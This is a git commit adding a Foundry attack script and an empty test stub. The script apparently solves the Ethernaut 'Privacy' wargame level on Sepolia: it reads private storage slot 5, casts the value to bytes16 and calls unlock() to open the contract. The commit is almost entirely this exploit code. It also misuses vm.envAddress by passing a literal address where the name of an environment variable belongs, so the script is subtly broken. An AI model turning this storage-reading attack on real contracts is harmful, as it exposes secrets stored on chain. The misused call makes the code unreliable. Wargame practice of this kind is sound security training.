db37317a44dbaa604a85b8245d4214da7cfdb4cf
Yassine <cyas@Yassine>
2024-05-22 17:14:30 +0200

    finish

---
+++ privacy/script/Privacy.s.sol
@@ -0,0 +1,27 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.17;
+
+import "forge-std/Script.sol";
+import {Privacy} from "../src/Privacy.sol";
+
+contract PrivacyScript is Script {
+    function run() external {
+        address privacyAddress = vm.envAddress("0xF0011860A963e764b0eb36df6c960dDd06EdC69a");
+
+        Privacy privacy = Privacy(privacyAddress);
+
+        uint256 attackerKey = vm.envUint("PK_SEPOLIA");
+
+        vm.startBroadcast(attackerKey);
+        // read depuis 
+        bytes32 data = vm.load(address(privacy), bytes32(uint256(5)));
+        bytes16 key = bytes16(data);
+
+        privacy.unlock(key);
+
+        console2.log("'top' set to : ", privacy.locked());
+
+        vm.stopBroadcast();
+    }
+}
---
+++ privacy/test/Privacy.t.sol
@@ -0,0 +1,14 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.17;
+
+import {Test, console} from "forge-std/Test.sol";
+import {Privacy} from "../src/Privacy.sol";
+
+contract PrivacyTest is Test {
+    Privacy public privacy;
+
+    function setUp() public {
+        
+    }
+
+}
